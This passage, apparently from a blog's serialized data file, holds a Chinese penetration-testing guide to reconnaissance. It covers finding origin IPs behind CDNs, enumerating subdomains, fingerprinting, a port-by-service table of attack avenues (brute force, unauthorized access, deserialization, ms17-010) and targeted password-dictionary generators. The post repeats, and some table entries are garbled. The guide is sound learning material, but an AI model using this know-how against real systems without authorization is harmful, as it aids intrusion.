文件上传/未授权访问 | \n1080 | socket | 爆破 | \n1352 | Lotus domino邮件服务 | 爆破/信息泄漏 | \n1433 | mssql | 爆破/注入/SA弱口令 | \n1521 | oracle | 爆破/注入/TNS爆破/反弹shell2O49NfS服务配置不当 | \n2181 | zookeeper服务 | 未授权访问 | \n2375 | docker remote api | 未授权访问 | \n3306 | mysql | 爆破/注入 | \n3389 | Rdp远程桌面链接 | 爆破/shfit后门 | \n4848 | GassFish控制台 | 爆破/认证绕过 | \n5000 | sybase/DB2数据库 | 爆破/注入/提权 | \n5432 | postgresql | 爆破/注入/缓冲区溢出 | \n5632 | pcanywhere服务 | 抓密码/代码执行 | \n5900 | vnc | 爆破/认证绕过 | \n6379 | Redis数据库 | 未授权访问/爆破 | \n7001/7002 | weblogic | 反序列化/控制台弱口令 | \n80/443 | http/https | web应用漏洞/心脏滴血 | \n8069 | zabbix服务 | 远程命令执行/注入 | \n8161 | activemq | 弱口令/写文件 | \n8080/8089 | Jboss/Tomcat/Resin | 爆破/PUT文件上传/反序列化 | \n8083/8086 | influxDB | 未授权访问 | \n9000 | fastcgi | 远程命令执行 | \n9090 | Websphere | 控制台爆破/java反序列化/弱口令 | \n9200/9300 | elasticsearch | 远程代码执行 | \n11211 | memcached | 未授权访问 | \n27017/27018 | mongodb | 未授权访问/爆破 | \n\n## 7.2 扫描工具\n- scanport\n- nmap\n- masscan\n- masnmapscan\n- zmap\n- 御剑高速TCP端口扫描工具\n- 御剑高速端口扫描工具\n- IISPutScanner\n- IISPutScanner增强版-DotNetScan\n\n# 8 口令收集\n\n## 8.1 弱口令字典的生成\n\n- 针对个人信息生成针对个人的密码字典\n\n[CTF密码生成器](https://www.bugku.com/mima/)\n\n- 白鹿社工字典生成器\n\n[白鹿社工字典生成器](https://github.com/x311/BaiLu-SED-Tool)\n\n\n\n","slug":"2022-05-30.信息收集","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9az0005oqna5co8g8zl","content":"<ul>\n<li><a href=\"#1-ip%E6%94%B6%E9%9B%86\">1 IP收集</a><ul>\n<li><a href=\"#11-%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8cdn\">1.1 判断目标有没有使用CDN</a></li>\n<li><a href=\"#12-%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip\">1.2 查找真实IP</a><ul>\n<li><a href=\"#121-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C%E6%90%9C%E7%B4%A2%E5%B9%B3%E5%8F%B0\">1.2.1 大数据网络搜索平台</a></li>\n<li><a href=\"#122-%E5%8E%86%E5%8F%B2dns%E8%AE%B0%E5%BD%95\">1.2.2 历史DNS记录</a></li>\n<li><a href=\"#123-%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%9A%B4%E9%9C%B2%E7%9A%84%E7%9C%9F%E5%AE%9Eip\">1.2.3 主动连接暴露的真实ip</a></li>\n<li><a href=\"#124-%E5%9B%BD%E5%A4%96%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE\">1.2.4 国外代理访问</a></li>\n<li><a href=\"#125-%E7%BA%AF%E7%9C%9Fip%E6%95%B0%E6%8D%AE%E5%BA%93\">1.2.5 纯真ip数据库</a></li>\n</ul>\n</li>\n<li><a href=\"#13-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">1.3 IP信息收集</a><ul>\n<li><a href=\"#131-ip-%E6%AE%B5%E6%95%B4%E7%90%86\">1.3.1 IP 段整理</a></li>\n<li><a href=\"#132-c%E6%AE%B5%E6%97%81%E7%AB%99\">1.3.2 C段、旁站</a></li>\n</ul>\n</li>\n<li><a href=\"#14-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E\">1.4 搜索引擎</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%9F%9F%E5%90%8D%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86\">2 域名、子域名收集</a><ul>\n<li><a href=\"#21-%E5%9F%9F%E5%90%8D%E7%9A%84%E5%A4%87%E6%A1%88%E5%8F%B7\">2.1 域名的备案号</a></li>\n<li><a href=\"#22-%E5%AD%90%E5%9F%9F%E5%90%8D%E5%B7%A5%E5%85%B7\">2.2 子域名工具</a></li>\n<li><a href=\"#23-%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E5%8F%A3\">2.3 在线子域名接口</a></li>\n<li><a href=\"#24-%E5%85%B6%E4%BB%96%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF\">2.4 其他泄露信息</a></li>\n<li><a href=\"#25-ssl%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2\">2.5 SSL证书查询</a></li>\n</ul>\n</li>\n<li><a href=\"#3-app%E6%94%B6%E9%9B%86\">3 APP收集</a><ul>\n<li><a href=\"#31-app%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC\">3.1 app信息收集和历史版本</a></li>\n<li><a href=\"#32-%E5%B7%A5%E5%85%B7\">3.2 工具</a></li>\n</ul>\n</li>\n<li><a href=\"#4-mail%E6%94%B6%E9%9B%86\">4 MAIL收集</a></li>\n<li><a href=\"#5-web%E6%94%B6%E9%9B%86\">5 WEB收集</a></li>\n<li><a href=\"#6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB\">6 指纹识别</a><ul>\n<li><a href=\"#61-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E7%AB%99\">6.1 第三方网站</a></li>\n<li><a href=\"#62-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6\">6.2 浏览器插件</a></li>\n<li><a href=\"#63-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7\">6.3 其他工具</a></li>\n</ul>\n</li>\n<li><a href=\"#7-%E7%AB%AF%E5%8F%A3%E8%AF%86%E5%88%AB\">7 端口识别</a><ul>\n<li><a href=\"#71-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3\">7.1 常见端口</a></li>\n<li><a href=\"#72-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7\">7.2 扫描工具</a></li>\n</ul>\n</li>\n<li><a href=\"#8-%E5%8F%A3%E4%BB%A4%E6%94%B6%E9%9B%86\">8 口令收集</a><ul>\n<li><a href=\"#81-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8%E7%9A%84%E7%94%9F%E6%88%90\">8.1 弱口令字典的生成</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-IP收集\"><a href=\"#1-IP收集\" class=\"headerlink\" title=\"1 IP收集\"></a>1 IP收集</h1><h2 id=\"1-1-判断目标有没有使用CDN\"><a href=\"#1-1-判断目标有没有使用CDN\" class=\"headerlink\" title=\"1.1 判断目标有没有使用CDN\"></a>1.1 判断目标有没有使用CDN</h2><p><a href=\"https://ping.chinaz.com/\">全球ping</a></p>\n<p>以 baidu.com 为例，全球ping结果显示如下，其中ip归属地皆为中国北京海淀 电信，但是ip地址不同，则可以确定为使用了CDN，如果结果显示ip归属地在不同地址，也可以确定为使用了CDN：</p>\n<table>\n<thead>\n<tr>\n<th>监测点</th>\n<th>响应IP</th>\n<th>IP归属地</th>\n<th>响应时间</th>\n<th>TTL</th>\n<th>赞助商</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>四川绵阳[电信]</td>\n<td>220.181.38.251</td>\n<td>中国北京海淀 电信</td>\n<td>35ms</td>\n<td>53ms</td>\n<td></td>\n</tr>\n<tr>\n<td>河南洛阳[多线]</td>\n<td>220.181.38.148</td>\n<td>中国北京海淀 电信</td>\n<td>23ms</td>\n<td>52ms</td>\n<td></td>\n</tr>\n<tr>\n<td>江苏镇江[多线]</td>\n<td>220.181.38.251</td>\n<td>中国北京海淀 电信</td>\n<td>32ms</td>\n<td>49ms</td>\n<td></td>\n</tr>\n<tr>\n<td>江苏镇江[电信]</td>\n<td>220.181.38.148</td>\n<td>中国北京海淀 电信</td>\n<td>27ms</td>\n<td>50ms</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"1-2-查找真实IP\"><a href=\"#1-2-查找真实IP\" class=\"headerlink\" title=\"1.2 查找真实IP\"></a>1.2 查找真实IP</h2><blockquote>\n<p>Tips:找到真实ip，绑定host，可以打开目标网站就是真实ip</p>\n</blockquote>\n<h3 id=\"1-2-1-大数据网络搜索平台\"><a href=\"#1-2-1-大数据网络搜索平台\" class=\"headerlink\" title=\"1.2.1 大数据网络搜索平台\"></a>1.2.1 大数据网络搜索平台</h3><p><a href=\"https://zoomeye.org/\">钟馗之眼</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC.png\" alt=\"钟馗之眼\"></p>\n<p><a href=\"https://www.censys.io/\">censys</a></p>\n<p><a href=\"https://fofa.info/\">FOFA</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fofa.png\" alt=\"FOFA\"></p>\n<p><a href=\"%5Bshodan%5D(https://www.shodan.io/)\">shodan</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/shodan.png\" alt=\"shoda\"></p>\n<h3 id=\"1-2-2-历史DNS记录\"><a href=\"#1-2-2-历史DNS记录\" class=\"headerlink\" title=\"1.2.2 历史DNS记录\"></a>1.2.2 历史DNS记录</h3><blockquote>\n<p>最早解析的ip地址为真实ip地址，(可能会存在使用CDN前的ip地址)</p>\n</blockquote>\n<p><a href=\"https://dnsdb.io/zh-cn\">全球DNS搜索引擎</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%85%A8%E7%90%83DNS%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E.png\" alt=\"全球DNS搜索引擎\"></p>\n<p><a href=\"https://x.threatbook.cn/\">情报社区</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF.png\" alt=\"情报社区\"></p>\n<p><a href=\"https://toolbar.netcraft.com/site_report?url=\">Netcraft</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Netcraft.png\" alt=\"Netcraft\"></p>\n<p><a href=\"http://viewdns.info/\">viewdnsinfo</a></p>\n<p><a href=\"https://github.com/3xp10it/xcdn\">xcdn</a></p>\n<p><a href=\"http://bobao.360.cn/learning/detail/221.html\">zmap</a></p>\n<h3 id=\"1-2-3-主动连接暴露的真实ip\"><a href=\"#1-2-3-主动连接暴露的真实ip\" class=\"headerlink\" title=\"1.2.3 主动连接暴露的真实ip\"></a>1.2.3 主动连接暴露的真实ip</h3><ul>\n<li>注册网站邮件验证(显示邮件原文，from字段为真实ip)</li>\n<li>RSS</li>\n<li>订阅网站</li>\n</ul>\n<h3 id=\"1-2-4-国外代理访问\"><a href=\"#1-2-4-国外代理访问\" class=\"headerlink\" title=\"1.2.4 国外代理访问\"></a>1.2.4 国外代理访问</h3><p>国内的CDN往往只针对国内用户访问加速，有时候通过国外的DNS解析可以得到真实IP</p>\n<h3 id=\"1-2-5-纯真ip数据库\"><a href=\"#1-2-5-纯真ip数据库\" class=\"headerlink\" title=\"1.2.5 纯真ip数据库\"></a>1.2.5 纯真ip数据库</h3><h2 id=\"1-3-IP信息收集\"><a href=\"#1-3-IP信息收集\" class=\"headerlink\" title=\"1.3 IP信息收集\"></a>1.3 IP信息收集</h2><h3 id=\"1-3-1-IP-段整理\"><a href=\"#1-3-1-IP-段整理\" class=\"headerlink\" title=\"1.3.1 IP 段整理\"></a>1.3.1 IP 段整理</h3><p><a href=\"https://ipwhois.cnnic.net.cn/\">CNNICIP</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ip%E6%AE%B5.png\" alt=\"CNNICIP\"></p>\n<h3 id=\"1-3-2-C段、旁站\"><a href=\"#1-3-2-C段、旁站\" class=\"headerlink\" title=\"1.3.2 C段、旁站\"></a>1.3.2 C段、旁站</h3><p><a href=\"http://www.webscan.cc/\">WebScan</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/WebScan.png\" alt=\"WebScan\"></p>\n<p><a href=\"https://chapangzhan.com/\">查旁站</a></p>\n<h2 id=\"1-4-搜索引擎\"><a href=\"#1-4-搜索引擎\" class=\"headerlink\" title=\"1.4 搜索引擎\"></a>1.4 搜索引擎</h2><p><a href=\"https://scholar.google.com.ph/\">google学术</a></p>\n<h1 id=\"2-域名、子域名收集\"><a href=\"#2-域名、子域名收集\" class=\"headerlink\" title=\"2 域名、子域名收集\"></a>2 域名、子域名收集</h1><h2 id=\"2-1-域名的备案号\"><a href=\"#2-1-域名的备案号\" class=\"headerlink\" title=\"2.1 域名的备案号\"></a>2.1 域名的备案号</h2><p><a href=\"icp.chinaz.com\">chinaz</a></p>\n<h2 id=\"2-2-子域名工具\"><a href=\"#2-2-子域名工具\" class=\"headerlink\" title=\"2.2 子域名工具\"></a>2.2 子域名工具</h2><ul>\n<li>子域名挖掘机Layer</li>\n<li>Sublist3r</li>\n<li>oneforall</li>\n</ul>\n<h2 id=\"2-3-在线子域名接口\"><a href=\"#2-3-在线子域名接口\" class=\"headerlink\" title=\"2.3 在线子域名接口\"></a>2.3 在线子域名接口</h2><ol>\n<li><a href=\"https://securitytrails.com/list/apex_domain\">https://securitytrails.com/list/apex_domain</a></li>\n<li><a href=\"http://ce.baidu.com/index/getRelatedSites\">http://ce.baidu.com/index/getRelatedSites</a></li>\n<li><a href=\"https://dnsdumpster.com/\">https://dnsdumpster.com/</a></li>\n<li><a href=\"https://findsubdomains.com/\">https://findsubdomains.com/</a></li>\n<li><a href=\"https://dnslytics.com/domain\">https://dnslytics.com/domain</a></li>\n</ol>\n<h2 id=\"2-4-其他泄露信息\"><a href=\"#2-4-其他泄露信息\" class=\"headerlink\" title=\"2.4 其他泄露信息\"></a>2.4 其他泄露信息</h2><ol>\n<li>crossdomain.xml文件</li>\n<li>爬虫递归爬取</li>\n<li>DNS域传送漏洞</li>\n</ol>\n<h2 id=\"2-5-SSL证书查询\"><a href=\"#2-5-SSL证书查询\" class=\"headerlink\" title=\"2.5 SSL证书查询\"></a>2.5 SSL证书查询</h2><ol>\n<li>不安全的站点，浏览器证书信息泄露</li>\n<li>dnsdumpster.com</li>\n</ol>\n<h1 id=\"3-APP收集\"><a href=\"#3-APP收集\" class=\"headerlink\" title=\"3 APP收集\"></a>3 APP收集</h1><h2 id=\"3-1-app信息收集和历史版本\"><a href=\"#3-1-app信息收集和历史版本\" class=\"headerlink\" title=\"3.1 app信息收集和历史版本\"></a>3.1 app信息收集和历史版本</h2><ul>\n<li>ios：同公司的其他产品</li>\n<li>android：酷安、碗豆荚等</li>\n</ul>\n<h2 id=\"3-2-工具\"><a href=\"#3-2-工具\" class=\"headerlink\" title=\"3.2 工具\"></a>3.2 工具</h2><blockquote>\n<p>未加密的app会扫描出大量可注入链接</p>\n</blockquote>\n<ul>\n<li>appinfoscanner</li>\n</ul>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/appinfoscanner.png\" alt=\"appinfoscanner\"></p>\n<h1 id=\"4-MAIL收集\"><a href=\"#4-MAIL收集\" class=\"headerlink\" title=\"4 MAIL收集\"></a>4 MAIL收集</h1><p><a href=\"https://hunter.io/\">email猎人在线</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%8C%8E%E4%BA%BA%E5%9C%A8%E7%BA%BF.png\" alt=\"email猎人在线\"></p>\n<p><a href=\"https://email-format.com/i/search_result/?q=\">email-format</a></p>\n<p><img src=\"/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/email-format.png\" alt=\"email-format\"></p>\n<h1 id=\"5-WEB收集\"><a href=\"#5-WEB收集\" class=\"headerlink\" title=\"5 WEB收集\"></a>5 WEB收集</h1><p><a href=\"https://github.com/ElevenPaths/FOCA\">FOCA</a></p>\n<h1 id=\"6-指纹识别\"><a href=\"#6-指纹识别\" class=\"headerlink\" title=\"6 指纹识别\"></a>6 指纹识别</h1><h2 id=\"6-1-第三方网站\"><a href=\"#6-1-第三方网站\" class=\"headerlink\" title=\"6.1 第三方网站\"></a>6.1 第三方网站</h2><p><a href=\"www.yunsee.cn\">云悉</a></p>\n<h2 id=\"6-2-浏览器插件\"><a href=\"#6-2-浏览器插件\" class=\"headerlink\" title=\"6.2 浏览器插件\"></a>6.2 浏览器插件</h2><ul>\n<li>wappalyzer</li>\n</ul>\n<h2 id=\"6-3-其他工具\"><a href=\"#6-3-其他工具\" class=\"headerlink\" title=\"6.3 其他工具\"></a>6.3 其他工具</h2><ul>\n<li>what-web</li>\n<li>finger</li>\n</ul>\n<h1 id=\"7-端口识别\"><a href=\"#7-端口识别\" class=\"headerlink\" title=\"7 端口识别\"></a>7 端口识别</h1><h2 id=\"7-1-常见端口\"><a href=\"#7-1-常见端口\" class=\"headerlink\" title=\"7.1 常见端口\"></a>7.1 常见端口</h2><table>\n<thead>\n<tr>\n<th>端口</th>\n<th>服务</th>\n<th>总结</th>\n<th>文档</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>21</td>\n<td>FTP&#x2F;TFTP&#x2F;VSFTPD</td>\n<td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td>\n<td></td>\n</tr>\n<tr>\n<td>22</td>\n<td>SSH远程连接</td>\n<td>爆破&#x2F;openssh漏洞</td>\n<td></td>\n</tr>\n<tr>\n<td>23</td>\n<td>TELNET远程连接</td>\n<td>爆破&#x2F;嗅探&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>25</td>\n<td>SMTP邮件服务</td>\n<td>邮件伪造</td>\n<td></td>\n</tr>\n<tr>\n<td>53</td>\n<td>DNS域名解析系统</td>\n<td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td>\n<td></td>\n</tr>\n<tr>\n<td>67&#x2F;68</td>\n<td>dhcp服务</td>\n<td>劫持&#x2F;欺骗</td>\n<td></td>\n</tr>\n<tr>\n<td>110</td>\n<td>pop3</td>\n<td>爆破&#x2F;嗅探</td>\n<td></td>\n</tr>\n<tr>\n<td>139</td>\n<td>samba服务</td>\n<td>爆破&#x2F;未授权访问&#x2F;远程命令执行</td>\n<td></td>\n</tr>\n<tr>\n<td>143</td>\n<td>Imap协议</td>\n<td>爆破JGSNMP协议爆破&#x2F;搜集目标内网信息</td>\n<td></td>\n</tr>\n<tr>\n<td>389</td>\n<td>Ldap目录访问协议</td>\n<td>注入&#x2F;未授权访问&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>445</td>\n<td>smb</td>\n<td>ms17-010端口溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>512&#x2F;513&#x2F;514</td>\n<td>Linux Rexec服务</td>\n<td>爆破&#x2F;Rlogin登陆</td>\n<td></td>\n</tr>\n<tr>\n<td>873</td>\n<td>Rsyxc服务</td>\n<td>文件上传&#x2F;未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>1080</td>\n<td>socket</td>\n<td>爆破</td>\n<td></td>\n</tr>\n<tr>\n<td>1352</td>\n<td>Lotus domino邮件服务</td>\n<td>爆破&#x2F;信息泄漏</td>\n<td></td>\n</tr>\n<tr>\n<td>1433</td>\n<td>mssql</td>\n<td>爆破&#x2F;注入&#x2F;SA弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>1521</td>\n<td>oracle</td>\n<td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2O49NfS服务配置不当</td>\n<td></td>\n</tr>\n<tr>\n<td>2181</td>\n<td>zookeeper服务</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>2375</td>\n<td>docker remote api</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>3306</td>\n<td>mysql</td>\n<td>爆破&#x2F;注入</td>\n<td></td>\n</tr>\n<tr>\n<td>3389</td>\n<td>Rdp远程桌面链接</td>\n<td>爆破&#x2F;shfit后门</td>\n<td></td>\n</tr>\n<tr>\n<td>4848</td>\n<td>GassFish控制台</td>\n<td>爆破&#x2F;认证绕过</td>\n<td></td>\n</tr>\n<tr>\n<td>5000</td>\n<td>sybase&#x2F;DB2数据库</td>\n<td>爆破&#x2F;注入&#x2F;提权</td>\n<td></td>\n</tr>\n<tr>\n<td>5432</td>\n<td>postgresql</td>\n<td>爆破&#x2F;注入&#x2F;缓冲区溢出</td>\n<td></td>\n</tr>\n<tr>\n<td>5632</td>\n<td>pcanywhere服务</td>\n<td>抓密码&#x2F;代码执行</td>\n<td></td>\n</tr>\n<tr>\n<td>5900</td>\n<td>vnc</td>\n<td>爆破&#x2F;认证绕过</td>\n<td></td>\n</tr>\n<tr>\n<td>6379</td>\n<td>Redis数据库</td>\n<td>未授权访问&#x2F;爆破</td>\n<td></td>\n</tr>\n<tr>\n<td>7001&#x2F;7002</td>\n<td>weblogic</td>\n<td>反序列化&#x2F;控制台弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>80&#x2F;443</td>\n<td>http&#x2F;https</td>\n<td>web应用漏洞&#x2F;心脏滴血</td>\n<td></td>\n</tr>\n<tr>\n<td>8069</td>\n<td>zabbix服务</td>\n<td>远程命令执行&#x2F;注入</td>\n<td></td>\n</tr>\n<tr>\n<td>8161</td>\n<td>activemq</td>\n<td>弱口令&#x2F;写文件</td>\n<td></td>\n</tr>\n<tr>\n<td>8080&#x2F;8089</td>\n<td>Jboss&#x2F;Tomcat&#x2F;Resin</td>\n<td>爆破&#x2F;PUT文件上传&#x2F;反序列化</td>\n<td></td>\n</tr>\n<tr>\n<td>8083&#x2F;8086</td>\n<td>influxDB</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>9000</td>\n<td>fastcgi</td>\n<td>远程命令执行</td>\n<td></td>\n</tr>\n<tr>\n<td>9090</td>\n<td>Websphere</td>\n<td>控制台爆破&#x2F;java反序列化&#x2F;弱口令</td>\n<td></td>\n</tr>\n<tr>\n<td>9200&#x2F;9300</td>\n<td>elasticsearch</td>\n<td>远程代码执行</td>\n<td></td>\n</tr>\n<tr>\n<td>11211</td>\n<td>memcached</td>\n<td>未授权访问</td>\n<td></td>\n</tr>\n<tr>\n<td>27017&#x2F;27018</td>\n<td>mongodb</td>\n<td>未授权访问&#x2F;爆破</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"7-2-扫描工具\"><a href=\"#7-2-扫描工具\" class=\"headerlink\" title=\"7.2 扫描工具\"></a>7.2 扫描工具</h2><ul>\n<li>scanport</li>\n<li>nmap</li>\n<li>masscan</li>\n<li>masnmapscan</li>\n<li>zmap</li>\n<li>御剑高速TCP端口扫描工具</li>\n<li>御剑高速端口扫描工具</li>\n<li>IISPutScanner</li>\n<li>IISPutScanner增强版-DotNetScan</li>\n</ul>\n<h1 id=\"8-口令收集\"><a href=\"#8-口令收集\" class=\"headerlink\" title=\"8 口令收集\"></a>8 口令收集</h1><h2 id=\"8-1-弱口令字典的生成\"><a href=\"#8-1-弱口令字典的生成\" class=\"headerlink\" title=\"8.1 弱口令字典的生成\"></a>8.1 弱口令字典的生成</h2><ul>\n<li>针对个人信息生成针对个人的密码字典</li>\n</ul>\n<p><a href=\"https://www.bugku.com/mima/\">CTF密码生成器</a></p>\n<ul>\n<li>白鹿社工字典生成器</li>\n</ul>\n<p><a href=\"https://github.com/x311/BaiLu-SED-Tool\">白鹿社工字典生成器</a></p>\n","site":{"data":{}},"wordcount":2768,"more":"<ul>\n<li><a href=\"#1-ip%E6%94%B6%E9%9B%86\">1 IP收集</a><ul>\n<li><a href=\"#11-%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8cdn\">1.1 判断目标有没有使用CDN</a></li>\n<li><a href=\"#12-%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip\">1.2 查找真实IP</a><ul>\n<li><a href=\"#121-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C%E6%90%9C%E7%B4%A2%E5%B9%B3%E5%8F%B0\">1.2.1 大数据网络搜索平台</a></li>\n<li><a href=\"#122-%E5%8E%86%E5%8F%B2dns%E8%AE%B0%E5%BD%95\">1.2.2 历史DNS记录</a></li>\n<li><a href=\"#123-%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%9A%B4%E9%9C%B2%E7%9A%84%E7%9C%9F%E5%AE%9Eip\">1.2.3 主动连接暴露的真实ip</a></li>\n<li><a href=\"#124-%E5%9B%BD%E5%A4%96%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE\">1.2.4 国外代理访问</a></li>\n<li><a href=\"#125-%E7%BA%AF%E7%9C%9Fip%E6%95%B0%E6%8D%AE%E5%BA%93\">1.2.5 纯真ip数据库</a></li>\n</ul>\n</li>\n<li><a href=\"#13-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\">1.3 IP信息收集</a><ul>\n<li><a href=\"#131-ip-%E6%AE%B5%E6%95%B4%E7%90%86\">1.3.1 IP 段整理</a></li>\n<li><a href=\"#132-c%E6%AE%B5%E6%97%81%E7%AB%99\">1.3.2 C段、旁站</a></li>\n</ul>\n</li>\n<li><a href=\"#14-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E\">1.4 搜索引擎</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%9F%9F%E5%90%8D%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86\">2 域名、子域名收集</a><ul>\n<li><a href=\"#21-%E5%9F%9F%E5%90%8D%E7%9A%84%E5%A4%87%E6%A1%88%E5%8F%B7\">2.1 域名的备案号</a></li>\n<li><a href=\"#22-%E5%AD%90%E5%9F%9F%E5%90%8D%E5%B7%A5%E5%85%B7\">2.2 子域名工具</a></li>\n<li><a href=\"#23-%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E5%8F%A3\">2.3 在线子域名接口</a></li>\n<li><a href=\"#24-%E5%85%B6%E4%BB%96%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF\">2.4 其他泄露信息</a></li>\n<li><a href=\"#25-ssl%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2\">2.5 SSL证书查询</a></li>\n</ul>\n</li>\n<li><a href=\"#3-app%E6%94%B6%E9%9B%86\">3 APP收集</a><ul>\n<li><a href=\"#31-app%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC\">3.1 app信息收集和历史版本</a></li>\n<li><a href=\"#32-%E5%B7%A5%E5%85%B7\">3.2 工具</a></li>\n</ul>\n</li>\n<li><a href=\"#4-mail%E6%94%B6%E9%9B%86\">4 MAIL收集</a></li>\n<li><a href=\"#5-web%E6%94%B6%E9%9B%86\">5 WEB收集</a></li>\n<li><a href=\"#6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB\">6 指纹识别</a><ul>\n<li><a href=\"#61-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E7%AB%99\">6.1 第三方网站</a></li>\n<li><a href=\"#62-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6\">6.2 浏览器插件</a></li>\n<li><a href=\"#63-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7\">6.3 其他工具</a></li>\n</ul>\n</li>\n<li><a href=\"#7-%E7%AB%AF%E5%8F%A3%E8%AF%86%E5%88%AB\">7 端口识别</a><ul>\n<li><a href=\"#71-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3\">7.1 常见端口</a></li>\n<li><a href=\"#72-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7\">7.2 扫描工具</a></li>\n</ul>\n</li>\n<li><a href=\"#8-%E5%8F%A3%E4%BB%A4%E6%94%B6%E9%9B%86\">8 口令收集</a><ul>\n<li><a href=\"#81-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8%E7%9A%84%E7%94%9F%E6%88%90\">8.1 弱口令字典的生成</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-IP收集\"><a href=\"#1-IP收集\" class=\"headerlink\" title=\"1 IP收集\"></a>1 IP收集</h1><h2 id=\"1-1-判断目标有没有使用CDN\"><a href=\"#1-1-判断目标有没有使用CDN\" class=\"headerlink\" title=\"1.1 判断目标有没有使用CDN\"></a>1.1 判断目标有没有使用CDN</h2><p><a href=\"https://ping.chinaz.com/\">全球ping</a></p>\n<p>以 baidu.com 为例，全球ping结果显示如下，其中ip归属地皆为中国北京海淀 